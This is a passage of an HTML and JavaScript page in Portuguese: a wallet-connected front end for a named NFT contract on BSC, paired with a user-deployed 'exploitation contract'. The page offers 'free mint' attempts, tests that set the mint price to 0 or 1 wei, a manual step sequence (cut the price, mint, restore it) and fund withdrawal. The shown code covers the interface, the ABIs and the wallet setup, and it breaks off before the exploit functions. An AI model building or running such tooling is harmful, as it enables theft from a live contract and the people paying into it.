<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>noahNFT - Plataforma de Interação Avançada</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: #fff;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            max-width: 1000px;
            padding: 30px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            margin-top: 50px;
            margin-bottom: 50px;
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .card-header {
            background: rgba(255, 255, 255, 0.2);
            font-weight: bold;
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }
        .btn-primary {
            background: linear-gradient(45deg, #3a7bd5, #00d2ff);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.4);
        }
        .btn-success {
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-warning {
            background: linear-gradient(45deg, #f093fb, #f5576c);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-danger {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-info {
            background: linear-gradient(45deg, #00c6ff, #0072ff);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .wallet-info {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .balance-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .balance-value {
            font-size: 24px;
            font-weight: bold;
            color: #4fc3f7;
        }
        .nft-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }
        .nft-image {
            width: 80px;
            height: 80px;
            border-radius: 10px;
            margin-right: 15px;
            background: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #fdbb2d;
        }
        .nft-info {
            flex-grow: 1;
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-connected {
            background-color: #4caf50;
        }
        .status-disconnected {
            background-color: #f44336;
        }
        .exploit-section {
            background: rgba(255, 0, 0, 0.15);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            border: 1px dashed #ff0000;
        }
        .contract-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .loading.show {
            display: block;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
        }
        .transaction-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            display: none;
        }
        .transaction-info.show {
            display: block;
        }
        .alert-custom {
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.7);
        }
        .tab-content {
            padding: 20px 0;
        }
        .nav-tabs .nav-link {
            color: rgba(255, 255, 255, 0.7);
            border: none;
            border-radius: 10px 10px 0 0;
            margin-right: 5px;
        }
        .nav-tabs .nav-link.active {
            color: #fff;
            background: rgba(255, 255, 255, 0.2);
            border: none;
        }
        .contract-deploy {
            background: rgba(0, 255, 0, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            border: 1px dashed #00ff00;
        }
        .code-block {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
        }
        .success-box {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4caf50;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .error-details {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #f44336;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
        .gas-options {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid #ffc107;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .debug-info {
            background: rgba(33, 150, 243, 0.2);
            border: 1px solid #2196f3;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
        }
        .step-by-step {
            background: rgba(156, 39, 176, 0.2);
            border: 1px solid #9c27b0;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .step {
            margin-bottom: 15px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
        }
        .step-number {
            display: inline-block;
            width: 25px;
            height: 25px;
            background: #9c27b0;
            border-radius: 50%;
            text-align: center;
            line-height: 25px;
            margin-right: 10px;
            font-weight: bold;
        }
        .step-status {
            float: right;
            font-size: 14px;
        }
        .step-status.pending {
            color: #ffc107;
        }
        .step-status.success {
            color: #4caf50;
        }
        .step-status.error {
            color: #f44336;
        }
        .diagnostic-card {
            background: rgba(255, 87, 34, 0.2);
            border: 1px solid #ff5722;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .result-item {
            padding: 8px;
            margin: 5px 0;
            border-radius: 5px;
            background: rgba(0, 0, 0, 0.2);
        }
        .result-success {
            border-left: 4px solid #4caf50;
        }
        .result-error {
            border-left: 4px solid #f44336;
        }
        .result-pending {
            border-left: 4px solid #ffc107;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-center mb-4">
            <h1 class="display-4"><i class="fas fa-coins"></i> noahNFT - Plataforma de Interação Avançada</h1>
            <p class="lead">Interação com Contrato NFT e Contrato de Exploração</p>
        </div>

        <div id="alertContainer"></div>

        <!-- Carteira -->
        <div class="wallet-info">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <span class="status-indicator" id="connectionStatus"></span>
                    <span id="connectionText">Não conectado</span>
                </div>
                <button id="connectWalletBtn" class="btn btn-primary">
                    <i class="fas fa-wallet"></i> Conectar Carteira
                </button>
            </div>
            <div class="mt-3" id="walletAddress" style="display: none;">
                <strong>Endereço:</strong> <span id="addressText"></span>
                <button class="btn btn-sm btn-outline-light ms-2" id="copyAddressBtn">
                    <i class="fas fa-copy"></i>
                </button>
            </div>
        </div>

        <!-- Informações dos Contratos -->
        <div class="contract-info">
            <h5><i class="fas fa-info-circle"></i> Informações dos Contratos</h5>
            <div class="row">
                <div class="col-md-6">
                    <strong>Contrato Original:</strong><br>
                    <span id="originalContract">0x660689af09aB2628afBd781e541bB1DD3d316DD9</span>
                </div>
                <div class="col-md-6">
                    <strong>Contrato de Exploração:</strong><br>
                    <span id="exploitContract">Não configurado</span>
                </div>
            </div>
        </div>

        <!-- Abas -->
        <ul class="nav nav-tabs" id="contractTabs" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="original-tab" data-bs-toggle="tab" data-bs-target="#original" type="button" role="tab" aria-controls="original" aria-selected="true">
                    <i class="fas fa-coins"></i> Contrato Original
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="exploit-tab" data-bs-toggle="tab" data-bs-target="#exploit" type="button" role="tab" aria-controls="exploit" aria-selected="false">
                    <i class="fas fa-bug"></i> Contrato de Exploração
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="diagnostic-tab" data-bs-toggle="tab" data-bs-target="#diagnostic" type="button" role="tab" aria-controls="diagnostic" aria-selected="false">
                    <i class="fas fa-stethoscope"></i> Diagnóstico
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="step-tab" data-bs-toggle="tab" data-bs-target="#step" type="button" role="tab" aria-controls="step" aria-selected="false">
                    <i class="fas fa-list-ol"></i> Mint Passo a Passo
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="debug-tab" data-bs-toggle="tab" data-bs-target="#debug" type="button" role="tab" aria-controls="debug" aria-selected="false">
                    <i class="fas fa-bug"></i> Debug
                </button>
            </li>
        </ul>
        <div class="tab-content" id="contractTabsContent">
            <!-- Conteúdo do Contrato Original -->
            <div class="tab-pane fade show active" id="original" role="tabpanel" aria-labelledby="original-tab">
                <!-- Saldos -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="balance-card">
                            <div class="balance-value" id="usdtBalance">0 USDT</div>
                            <div>Saldo de USDT</div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="balance-card">
                            <div class="balance-value" id="nftCount">0 NFTs</div>
                            <div>Seus NFTs</div>
                        </div>
                    </div>
                </div>

                <!-- Mint de NFT -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-plus-circle"></i> Mint de NFT
                    </div>
                    <div class="card-body">
                        <p>Para mintar um NFT, você precisa de 30 USDT. Após o mint, você receberá recompensas em USDT periodicamente.</p>
                        <div class="d-grid gap-2">
                            <button id="mintNftBtn" class="btn btn-success" disabled>
                                <i class="fas fa-magic"></i> Mint NFT (30 USDT)
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Resgate de Recompensas -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-coins"></i> Resgate de Recompensas
                    </div>
                    <div class="card-body">
                        <p>Resgate suas recompensas acumuladas em USDT. Uma taxa de 5% será deduzida como taxa de serviço.</p>
                        <div class="d-grid gap-2">
                            <button id="claimRewardsBtn" class="btn btn-primary" disabled>
                                <i class="fas fa-hand-holding-usd"></i> Resgatar Recompensas
                            </button>
                        </div>
                        <div class="mt-3">
                            <strong>Recompensas disponíveis:</strong> <span id="availableRewards">0 USDT</span>
                        </div>
                    </div>
                </div>

                <!-- Seus NFTs -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-images"></i> Seus NFTs
                    </div>
                    <div class="card-body">
                        <div id="nftList">
                            <p class="text-center">Você não possui NFTs ainda</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Contrato de Exploração -->
            <div class="tab-pane fade" id="exploit" role="tabpanel" aria-labelledby="exploit-tab">
                <!-- Configurar Contrato de Exploração -->
                <div class="contract-deploy">
                    <h5><i class="fas fa-cog"></i> Configurar Contrato de Exploração V2</h5>
                    <p>Insira o endereço do novo contrato de exploração V2 que você implantou no Remix IDE.</p>
                    <div class="input-group mb-3">
                        <span class="input-group-text">Endereço do Contrato:</span>
                        <input type="text" class="form-control" id="exploitContractInput" placeholder="0x..." value="">
                        <button class="btn btn-primary" id="setExploitContractBtn">Configurar</button>
                    </div>
                    <div id="exploitStatus" class="success-box" style="display: none;">
                        <i class="fas fa-check-circle"></i> Contrato de exploração configurado com sucesso!
                    </div>
                </div>

                <!-- Opções de Gás -->
                <div class="gas-options">
                    <h5><i class="fas fa-gas-pump"></i> Opções de Gás</h5>
                    <p>Se estiver enfrentando problemas com a estimativa de gás, tente aumentar o limite de gás manualmente.</p>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="input-group mb-3">
                                <span class="input-group-text">Limite de Gás:</span>
                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="3000000">
                                <span class="input-group-text">unidades</span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="input-group mb-3">
                                <span class="input-group-text">Preço do Gás:</span>
                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="25">
                                <span class="input-group-text">Gwei</span>
                            </div>
                        </div>
                    </div>
                    <div class="form-check form-switch">
                        <input class="form-check-input" type="checkbox" id="skipGasEstimation">
                        <label class="form-check-label" for="skipGasEstimation">
                            Pular estimativa de gás (avançado)
                        </label>
                    </div>
                </div>

                <!-- Tentativas de Mint -->
                <div class="exploit-section">
                    <h5><i class="fas fa-bug"></i> Tentativas de Mint Gratuito</h5>
                    <p>O contrato V2 tenta múltiplas abordagens para conseguir o mint gratuito.</p>
                    <div class="d-grid gap-2">
                        <button id="freeMintBtn" class="btn btn-danger" disabled>
                            <i class="fas fa-magic"></i> Tentar Mint Gratuito
                        </button>
                    </div>
                </div>

                <!-- Verificar Permissões -->
                <div class="card mt-3">
                    <div class="card-header">
                        <i class="fas fa-shield-alt"></i> Verificar Permissões
                    </div>
                    <div class="card-body">
                        <p>Verifique se você tem permissão para alterar o preço do mint.</p>
                        <div class="d-grid gap-2">
                            <button id="checkPermissionsBtn" class="btn btn-info" disabled>
                                <i class="fas fa-check"></i> Verificar Permissões
                            </button>
                        </div>
                        <div class="mt-3">
                            <strong>Resultado:</strong> <span id="permissionsResult">Não verificado</span>
                        </div>
                    </div>
                </div>

                <!-- Informações do Contrato de Exploração -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-info-circle"></i> Informações do Contrato de Exploração
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <strong>Endereço:</strong> <span id="exploitContractAddress">Não configurado</span>
                        </div>
                        <div class="mb-3">
                            <strong>Dono:</strong> <span id="exploitContractOwner">N/A</span>
                        </div>
                        <div class="mb-3">
                            <strong>Saldo do Contrato:</strong> <span id="exploitContractBalance">0 BNB</span>
                        </div>
                        <div class="d-grid gap-2">
                            <button id="withdrawBtn" class="btn btn-warning" disabled>
                                <i class="fas fa-hand-holding-usd"></i> Sacar Fundos
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Diagnóstico -->
            <div class="tab-pane fade" id="diagnostic" role="tabpanel" aria-labelledby="diagnostic-tab">
                <div class="diagnostic-card">
                    <h5><i class="fas fa-stethoscope"></i> Diagnóstico do Contrato</h5>
                    <p>Esta ferramenta irá testar diferentes aspectos do contrato para identificar o problema.</p>
                    
                    <div class="d-grid gap-2 mb-3">
                        <button id="runDiagnosticBtn" class="btn btn-primary" disabled>
                            <i class="fas fa-play"></i> Executar Diagnóstico Completo
                        </button>
                    </div>
                    
                    <div id="diagnosticResults" style="display: none;">
                        <h6>Resultados do Diagnóstico:</h6>
                        
                        <div class="result-item result-pending" id="diagnostic1">
                            <strong>1. Verificar Proprietário do Contrato:</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="result-item result-pending" id="diagnostic2">
                            <strong>2. Testar setMintPrice(0):</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="result-item result-pending" id="diagnostic3">
                            <strong>3. Testar setMintPrice(1):</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="result-item result-pending" id="diagnostic4">
                            <strong>4. Testar mint() direto:</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="result-item result-pending" id="diagnostic5">
                            <strong>5. Verificar Saldo e Allowance:</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="result-item result-pending" id="diagnostic6">
                            <strong>6. Tentar Mint com Contrato V2:</strong> <span class="diagnostic-value">Executando...</span>
                        </div>
                        
                        <div class="mt-3">
                            <h6>Recomendações:</h6>
                            <div id="recommendations" class="code-block">
                                Aguardando diagnóstico...
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Mint Passo a Passo -->
            <div class="tab-pane fade" id="step" role="tabpanel" aria-labelledby="step-tab">
                <div class="step-by-step">
                    <h5><i class="fas fa-list-ol"></i> Mint Gratuito Passo a Passo</h5>
                    <p>Se o método automático falhar, tente executar cada passo manualmente.</p>
                    
                    <div class="step">
                        <span class="step-number">1</span>
                        <strong>Verificar Permissões</strong>
                        <span class="step-status pending" id="step1Status">Pendente</span>
                        <p class="mt-2">Verifique se você tem permissão para alterar o preço do mint.</p>
                        <div class="d-grid gap-2 mt-2">
                            <button id="step1Btn" class="btn btn-info" disabled>
                                <i class="fas fa-check"></i> Verificar Permissões
                            </button>
                        </div>
                    </div>
                    
                    <div class="step">
                        <span class="step-number">2</span>
                        <strong>Alterar Preço para 1 Wei</strong>
                        <span class="step-status pending" id="step2Status">Pendente</span>
                        <p class="mt-2">Tenta alterar o preço para 1 wei em vez de 0.</p>
                        <div class="d-grid gap-2 mt-2">
                            <button id="step2Btn" class="btn btn-warning" disabled>
                                <i class="fas fa-tag"></i> Alterar Preço para 1 Wei
                            </button>
                        </div>
                    </div>
                    
                    <div class="step">
                        <span class="step-number">3</span>
                        <strong>Mintar NFT</strong>
                        <span class="step-status pending" id="step3Status">Pendente</span>
                        <p class="mt-2">Mintar o NFT com o preço alterado.</p>
                        <div class="d-grid gap-2 mt-2">
                            <button id="step3Btn" class="btn btn-info" disabled>
                                <i class="fas fa-magic"></i> Mintar NFT
                            </button>
                        </div>
                    </div>
                    
                    <div class="step">
                        <span class="step-number">4</span>
                        <strong>Restaurar Preço Original</strong>
                        <span class="step-status pending" id="step4Status">Pendente</span>
                        <p class="mt-2">Restaura o preço original do mint (30 USDT).</p>
                        <div class="d-grid gap-2 mt-2">
                            <button id="step4Btn" class="btn btn-secondary" disabled>
                                <i class="fas fa-undo"></i> Restaurar Preço Original
                            </button>
                        </div>
                    </div>
                    
                    <div class="mt-4">
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i> <strong>Importante:</strong> Execute os passos em ordem. Se algum passo falhar, tente novamente antes de prosseguir.
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Debug -->
            <div class="tab-pane fade" id="debug" role="tabpanel" aria-labelledby="debug-tab">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-bug"></i> Informações de Debug
                    </div>
                    <div class="card-body">
                        <h5>Testar Funções Individualmente</h5>
                        <p>Use estas opções para testar cada função do contrato de exploração separadamente e identificar onde está o problema.</p>
                        
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <button id="testSetPriceBtn" class="btn btn-warning w-100" disabled>
                                    <i class="fas fa-tag"></i> Testar setMintPrice(0)
                                </button>
                            </div>
                            <div class="col-md-6">
                                <button id="testMintBtn" class="btn btn-info w-100" disabled>
                                    <i class="fas fa-magic"></i> Testar mint()
                                </button>
                            </div>
                        </div>
                        
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <button id="testSetPriceLowBtn" class="btn btn-warning w-100" disabled>
                                    <i class="fas fa-tag"></i> Testar setMintPrice(1)
                                </button>
                            </div>
                            <div class="col-md-6">
                                <button id="checkContractStateBtn" class="btn btn-primary w-100" disabled>
                                    <i class="fas fa-search"></i> Verificar Estado do Contrato
                                </button>
                            </div>
                        </div>
                        
                        <div id="debugInfo" class="debug-info" style="display: none;">
                            <h6>Informações de Debug:</h6>
                            <pre id="debugContent"></pre>
                        </div>
                        
                        <div class="mt-4">
                            <h5>Eventos do Contrato</h5>
                            <p>Monitore os eventos emitidos pelo contrato de exploração para entender o que está acontecendo.</p>
                            <button id="listenEventsBtn" class="btn btn-success" disabled>
                                <i class="fas fa-headphones"></i> Iniciar Monitoramento de Eventos
                            </button>
                            <div id="eventsList" class="debug-info mt-3" style="display: none;">
                                <h6>Eventos Recentes:</h6>
                                <div id="eventsContent"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Carregamento -->
        <div class="loading" id="loadingIndicator">
            <div class="spinner-border text-light" role="status">
                <span class="visually-hidden">Carregando...</span>
            </div>
            <p class="mt-2">Processando transação...</p>
        </div>

        <!-- Informações da Transação -->
        <div class="transaction-info" id="transactionInfo">
            <h5>Informações da Transação</h5>
            <div class="mb-2">
                <strong>Hash:</strong> <span id="txHash"></span>
                <button class="btn btn-sm btn-outline-light ms-2" id="copyTxHashBtn">
                    <i class="fas fa-copy"></i>
                </button>
            </div>
            <div>
                <strong>Status:</strong> <span id="txStatus"></span>
            </div>
        </div>

        <div class="footer">
            <p>Contrato Original: 0x660689af09aB2628afBd781e541bB1DD3d316DD9</p>
            <p>Rede: BSC (BEP-20)</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // Configurações
        const ORIGINAL_CONTRACT_ADDRESS = "0x660689af09aB2628afBd781e541bB1DD3d316DD9";
        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT na BSC
        
        // ABI do contrato noahNFT
        const ORIGINAL_CONTRACT_ABI = [
            "function mint() public",
            "function claim() public",
            "function balanceOf(address owner) view returns (uint256)",
            "function ownerOf(uint256 tokenId) view returns (address)",
            "function getReward(address user) view returns (uint256)",
            "function lastClaimed(uint256 tokenId) view returns (uint256)",
            "function setMintPrice(uint256 newPrice) public",
            "function owner() view returns (address)",
            "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
            "function totalSupply() view returns (uint256)",
            "function tokenURI(uint256 tokenId) view returns (string memory)",
            "event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)"
        ];
        
        // ABI do contrato de exploração V2
        const EXPLOIT_CONTRACT_V2_ABI = [
            "function attemptFreeMint() external returns (bool)",
            "function canChangePrice() public view returns (bool)",
            "function withdraw() external",
            "function noahNFT() view returns (address)",
            "function owner() view returns (address)",
            "event FreeMintAttempt(address indexed user, bool success)",
            "event SetPriceAttempt(uint256 newPrice, bool success)"
        ];
        
        // ABI do token USDT (BEP-20)
        const USDT_ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
        ];
        
        // Variáveis globais
        let provider;
        let signer;
        let originalContract;
        let exploitContract;
        let usdtContract;
        let userAddress;
        let exploitContractAddress;
        let eventListeners = [];
        let diagnosticResults = {};
        
        // Elementos DOM
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const connectionStatus = document.getElementById('connectionStatus');
        const connectionText = document.getElementById('connectionText');
        const walletAddress = document.getElementById('walletAddress');
        const addressText = document.getElementById('addressText');
        const copyAddressBtn = document.getElementById('copyAddressBtn');
        const usdtBalance = document.getElementById('usdtBalance');
        const nftCount = document.getElementById('nftCount');
        const mintNftBtn = document.getElementById('mintNftBtn');
        const freeMintBtn = document.getElementById('freeMintBtn');
        const checkPermissionsBtn = document.getElementById('checkPermissionsBtn');
        const claimRewardsBtn = document.getElementById('claimRewardsBtn');
        const withdrawBtn = document.getElementById('withdrawBtn');
        const availableRewards = document.getElementById('availableRewards');
        const nftList = document.getElementById('nftList');
        const exploitContractAddressSpan = document.getElementById('exploitContractAddress');
        const exploitContractOwner = document.getElementById('exploitContractOwner');
        const exploitContractBalance = document.getElementById('exploitContractBalance');
        const permissionsResult = document.getElementById('permissionsResult');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const transactionInfo = document.getElementById('transactionInfo');
        const txHash = document.getElementById('txHash');
        const txStatus = document.getElementById('txStatus');
        const copyTxHashBtn = document.getElementById('copyTxHashBtn');
        const alertContainer = document.getElementById('alertContainer');
        const exploitContractInput = document.getElementById('exploitContractInput');
        const setExploitContractBtn = document.getElementById('setExploitContractBtn');
        const exploitStatus = document.getElementById('exploitStatus');
        const gasLimitInput = document.getElementById('gasLimitInput');
        const gasPriceInput = document.getElementById('gasPriceInput');
        const skipGasEstimation = document.getElementById('skipGasEstimation');
        const testSetPriceBtn = document.getElementById('testSetPriceBtn');
        const testSetPriceLowBtn = document.getElementById('testSetPriceLowBtn');
        const testMintBtn = document.getElementById('testMintBtn');
        const checkContractStateBtn = document.getElementById('checkContractStateBtn');
        const debugInfo = document.getElementById('debugInfo');
        const debugContent = document.getElementById('debugContent');
        const listenEventsBtn = document.getElementById('listenEventsBtn');
        const eventsList = document.getElementById('eventsList');
        const eventsContent = document.getElementById('eventsContent');
        const runDiagnosticBtn = document.getElementById('runDiagnosticBtn');
        const diagnosticResultsDiv = document.getElementById('diagnosticResults');
        const recommendations = document.getElementById('recommendations');
        const step1Btn = document.getElementById('step1Btn');
        const step2Btn = document.getElementById('step2Btn');
        const step3Btn = document.getElementById('step3Btn');
        const step4Btn = document.getElementById('step4Btn');
        const step1Status = document.getElementById('step1Status');
        const step2Status = document.getElementById('step2Status');
        const step3Status = document.getElementById('step3Status');
        const step4Status = document.getElementById('step4Status');
        
        // Event Listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        copyAddressBtn.addEventListener('click', () => copyToClipboard(addressText.textContent));
        mintNftBtn.addEventListener('click', mintNft);
        freeMintBtn.addEventListener('click', freeMint);
        checkPermissionsBtn.addEventListener('click', checkPermissions);
        claimRewardsBtn.addEventListener('click', claimRewards);
        withdrawBtn.addEventListener('click', withdrawFunds);
        copyTxHashBtn.addEventListener('click', () => copyToClipboard(txHash.textContent));
        setExploitContractBtn.addEventListener('click', setExploitContract);
        testSetPriceBtn.addEventListener('click', () => testSetPrice(0));
        testSetPriceLowBtn.addEventListener('click', () => testSetPrice(1));
        testMintBtn.addEventListener('click', testMint);
        checkContractStateBtn.addEventListener('click', checkContractState);
        listenEventsBtn.addEventListener('click', toggleEventListening);
        runDiagnosticBtn.addEventListener('click', runDiagnostic);
        step1Btn.addEventListener('click', step1CheckPermissions);
        step2Btn.addEventListener('click', step2SetPrice);
        step3Btn.addEventListener('click', step3Mint);
        step4Btn.addEventListener('click', step4RestorePrice);
        
        // Funções
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Conectar à carteira
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];
                    
                    // Configurar provider e signer
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    
                    // Configurar contratos
                    originalContract = new ethers.Contract(ORIGINAL_CONTRACT_ADDRESS, ORIGINAL_CONTRACT_ABI, signer);
                    usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
                    
                    // Atualizar UI
                    updateWalletUI();
                    await updateBalances();
                    await updateNFTs();
                    await updateRewards();
                    
                    // Habilitar botões
                    mintNftBtn.disabled = false;
                    claimRewardsBtn.disabled = false;
                    runDiagnosticBtn.disabled = false;
                    
                    showAlert('Carteira conectada com sucesso!', 'success');
                } catch (error) {
                    console.error('Erro ao conectar carteira:', error);
                    showAlert('Erro ao conectar carteira. Tente novamente.', 'danger');
                }
            } else {
                showAlert('MetaMask ou outra carteira compatível não encontrada. Instale a MetaMask e tente novamente.', 'danger');
            }
        }
        
        function updateWalletUI() {
            connectionStatus.className = 'status-indicator status-connected';
            connectionText.textContent = 'Conectado';
            connectWalletBtn.textContent = 'Desconectar';
            connectWalletBtn.onclick = disconnectWallet;
            walletAddress.style.display = 'block';
            addressText.textContent = userAddress;
        }
        
        function disconnectWallet() {
            location.reload();
        }
        
        async function updateBalances() {
            try {
                // Saldo de USDT
                const usdtBalanceWei = await usdtContract.balanceOf(userAddress);
                const usdtBalanceEth = ethers.utils.formatUnits(usdtBalanceWei, 18);
                usdtBalance.textContent = `${parseFloat(usdtBalanceEth).toFixed(2)} USDT`;
                
                // Contagem de NFTs
                const balance = await originalContract.balanceOf(userAddress);
                nftCount.textContent = `${balance.toString()} NFTs`;
                
                // Atualizar informações do contrato de exploração se existir
                if (exploitContract) {
                    const owner = await exploitContract.owner();
                    exploitContractOwner.textContent = owner;
                    
                    const balanceWei = await provider.getBalance(exploitContractAddress);
                    const balanceEth = ethers.utils.formatEther(balanceWei);
                    exploitContractBalance.textContent = `${parseFloat(balanceEth).toFixed(6)} BNB`;
                }
            } catch (error) {
                console.error('Erro ao atualizar saldos:', error);
            }
        }
        
        async function updateNFTs() {
            try {
                const balance = await originalContract.balanceOf(userAddress);
                
                if (balance.toNumber() === 0) {
                    nftList.innerHTML = '<p class="text-center">Você não possui NFTs ainda</p>';
                    return;
                }
                
                let nftHtml = '';
                
                for (let i = 0; i < balance.toNumber(); i++) {
                    const tokenId = await originalContract.tokenOfOwnerByIndex(userAddress, i);
                    const tokenURI = await originalContract.tokenURI(tokenId);
                    
                    // Simular imagem do NFT
                    nftHtml += `
                        <div class="nft-card">
                            <div class="nft-image">
                                <i class="fas fa-gem"></i>
                            </div>
                            <div class="nft-info">
                                <h5>NFT #${tokenId.toString()}</h5>
                                <p>Token ID: ${tokenId.toString()}</p>
                                <small>URI: ${tokenURI}</small>
                            </div>
                        </div>
                    `;
                }
                
                nftList.innerHTML = nftHtml;
            } catch (error) {
                console.error('Erro ao atualizar NFTs:', error);
            }
        }
        
        async function updateRewards() {
            try {
                const rewardsWei = await originalContract.getReward(userAddress);
                const rewardsEth = ethers.utils.formatUnits(rewardsWei, 18);
                availableRewards.textContent = `${parseFloat(rewardsEth).toFixed(6)} USDT`;
            } catch (error) {
                console.error('Erro ao atualizar recompensas:', error);
            }
        }
        
        async function mintNft() {
            if (!confirm('Tem certeza que deseja mintar um NFT por 30 USDT?')) {
                return;
            }
            
            showLoading(true);
            
            try {
